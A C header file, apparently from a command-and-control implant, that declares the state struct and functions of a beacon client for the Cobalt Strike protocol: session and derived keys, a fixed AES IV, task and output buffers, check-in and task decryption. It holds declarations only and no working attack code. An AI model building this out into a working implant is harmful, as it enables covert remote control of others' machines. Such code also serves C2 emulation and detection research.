/* copied from implant/headers/beacon.h, last synced 2026-02-26 */
#ifndef BEACON_H
#define BEACON_H

#include <stdint.h>
#include <stddef.h>

// Beacon state
typedef struct {
    char session_key[16];    // Raw session key (sent in metadata)
    uint8_t aes_key[16];     // Derived AES key (SHA256 of session_key, first 16 bytes)
    uint8_t hmac_key[16];    // Derived HMAC key (SHA256 of session_key, next 16 bytes)
    uint8_t aes_iv[16];      // AES IV (fixed: "abcdefghijklmnop")
    uint32_t agent_id;       // Unique agent identifier

    // Dual-counter system for C2 communication:
    // The CS C2 protocol uses two different "counter" mechanisms for each direction of communication.
    uint32_t last_server_time; // For server->client: Stores the last 'timestamp' received from the server. Used to validate incoming tasks.
    uint32_t upload_counter;   // For client->server: A simple incrementing counter for callbacks sent to the server.

    int connected;           // Connection status
    char *pending_tasks;     // Tasks from server
    size_t tasks_len;        // Length of tasks
    char *output_buffer;     // Queued output to send
    size_t output_len;       // Length of queued output
} beacon_state_t;

// Function declarations
int beacon_init(beacon_state_t *state);
int beacon_checkin(beacon_state_t *state);
int beacon_send_output(beacon_state_t *state, const char *output, size_t len);
void beacon_cleanup(beacon_state_t *state);
void beacon_sleep(void);

// Metadata generation - updated signature
uint8_t* beacon_generate_metadata(beacon_state_t *state, size_t *out_len);

// Task decryption
int beacon_decrypt_tasks(beacon_state_t *state, const uint8_t *ciphertext, size_t ciphertext_len,
                         uint8_t **plaintext_out, size_t *plaintext_len_out);

#endif // BEACON_H
